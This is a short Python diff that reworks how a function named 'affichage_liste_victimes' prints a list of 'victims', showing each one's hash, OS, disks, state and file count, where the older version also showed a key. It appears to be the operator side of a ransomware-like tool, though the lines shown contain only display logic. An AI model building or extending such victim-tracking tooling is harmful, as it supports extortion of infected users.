@@ -38,11 +38,11 @@ def affichage_liste_victimes():
         print("Aucune réponse reçue.")
         return
     #affiche les données
-    print(response)
-    '''data = response['victims']
-    for victim in data:
-        print(f"Victime : {victim[0]} | os: {victim[1]} | hash : {victim[2]} | disk : {victim[3]} | key : {victim[4]} ")'''
-
+    while response is not None and message.get_message_type(response) != 'LIST_END':
+        data = list(response.values())
+        print(
+            f"hash : {data[0]} | OS: {data[1]} | Disks: {data[2]} | State: {data[3]} | Nb_files: {data[4]}")
+        response = network.receive_message(s)
 
 
 
